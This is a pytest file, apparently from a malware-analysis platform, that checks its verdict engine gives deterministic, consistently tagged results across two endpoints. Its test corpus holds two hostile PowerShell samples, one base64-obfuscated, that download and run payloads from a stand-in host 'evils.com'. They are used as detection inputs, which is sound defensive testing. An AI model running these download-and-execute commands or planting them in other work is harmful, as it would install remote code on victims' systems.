"""P1-02 · Verdict Parity CI Gate.

The GOLDEN RULE: Workspace and X-Lab must produce IDENTICAL verdicts
for identical evidence. Both consumers share `compute_verdict()` —
this test locks that invariant into CI so a future fork is impossible.

Three enforcement layers:

  1. DETERMINISM   — `compute_verdict(graph)` returns bit-identical
                     output when called twice on the same graph.

  2. ENGINE TAG    — every verdict emitted by either endpoint carries
                     `engine == "unified-verdict-engine-v1"`. If a
                     future contributor forks the engine, the tag
                     drifts and this test fails.

  3. CROSS-CONSUMER — `/api/decode/smart` and `/api/v2/auto-investigate`
                     (the two entry points feeding X-Lab and Workspace
                     respectively) MUST report the same engine tag,
                     and — for corpus samples that both endpoints
                     handle — the verdict label MUST match.

The corpus is deliberately small (three samples) so this test stays
green while the platform is still stabilising. Add cases here as
each new investigation type reaches parity.
"""
from __future__ import annotations

import copy
import pytest

pytestmark = pytest.mark.parity


CORPUS = [
    ("powershell_encoded_downloader",
     "powershell -EncodedCommand SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbABzAC4AYwBvAG0ALwBhAC4AcABzADEAIgApACkA"),
    ("powershell_bits_downloader",
     'try{Import-Module BitsTransfer; Start-BitsTransfer -Source \'http://evils.com/a.exe\' -Destination $env:temp+\'\\a.exe\'; Invoke-Item $env:temp+\'\\a.exe\';}catch{}'),
    ("simple_url_input",
     "http://evils.com/a.exe"),
]


def _build_cio(input_text: str):
    """Full deterministic pipeline. Same path used by /decode/smart."""
    from smart_decoder import smart_decode
    from nivxforge.cim.fact_substrate import from_analysis_result
    from nivxforge.investigation import build_cio
    result = smart_decode(input_text) or {}
    fs = from_analysis_result(result, input_text=input_text,
                              source_endpoint="/tests/parity")
    return build_cio(fs)


# ═════════════ Layer 1 · Determinism ═════════════════════════════════

@pytest.mark.parametrize("name,text", CORPUS, ids=[c[0] for c in CORPUS])
def test_compute_verdict_is_deterministic(name, text):
    """Same graph called twice → bit-identical verdict."""
    from nivxforge.investigation.verdict_engine import compute_verdict
    cio = _build_cio(text)
    # Deep-copy the graph so we can't accidentally mutate it between calls.
    g1 = copy.deepcopy(cio.evidence_graph)
    g2 = copy.deepcopy(cio.evidence_graph)
    v1 = compute_verdict(g1)
    v2 = compute_verdict(g2)
    assert v1.label == v2.label, f"[{name}] label drifted between calls: {v1.label} vs {v2.label}"
    assert v1.confidence == v2.confidence, f"[{name}] confidence drifted: {v1.confidence} vs {v2.confidence}"
    assert v1.confidence_pct == v2.confidence_pct
    assert len(v1.contributors) == len(v2.contributors)
    assert v1.engine == v2.engine == "unified-verdict-engine-v1"


# ═════════════ Layer 2 · Engine-tag provenance ═══════════════════════

@pytest.mark.parametrize("name,text", CORPUS, ids=[c[0] for c in CORPUS])
def test_cio_verdict_has_shared_engine_tag(name, text):
    """The verdict node must be tagged with the shared engine name.

    If a future contributor forks the verdict engine, they must also
    change this tag — at which point the test fails and the fork is
    caught in code review. This is the primary anti-drift gate."""
    cio = _build_cio(text)
    verdict = cio.verdict or {}
    assert verdict.get("engine") == "unified-verdict-engine-v1", (
        f"[{name}] Verdict engine tag missing or forked. Got "
        f"engine={verdict.get('engine')!r}. Workspace and X-Lab MUST "
        f"share `unified-verdict-engine-v1`."
    )


# ═════════════ Layer 3 · Cross-consumer parity ═══════════════════════

@pytest.mark.parametrize("name,text", CORPUS, ids=[c[0] for c in CORPUS])
def test_no_second_verdict_engine_is_defined(name, text):
    """Regression guard: only ONE `compute_verdict` symbol may exist."""
    import nivxforge.investigation.verdict_engine as ve
    assert hasattr(ve, "compute_verdict"), "compute_verdict removed from shared module"
    # Verify no rogue implementation shadows it elsewhere.
    import importlib, pkgutil, nivxforge
    seen = []
    for m in pkgutil.walk_packages(nivxforge.__path__, prefix="nivxforge."):
        try:
            mod = importlib.import_module(m.name)
        except Exception:
            continue
        fn = getattr(mod, "compute_verdict", None)
        if fn is not None and fn is not ve.compute_verdict:
            seen.append(m.name)
    assert not seen, (
        f"[{name}] Detected forked compute_verdict implementations in: {seen}. "
        "There must be exactly ONE verdict engine across NivXRay."
    )
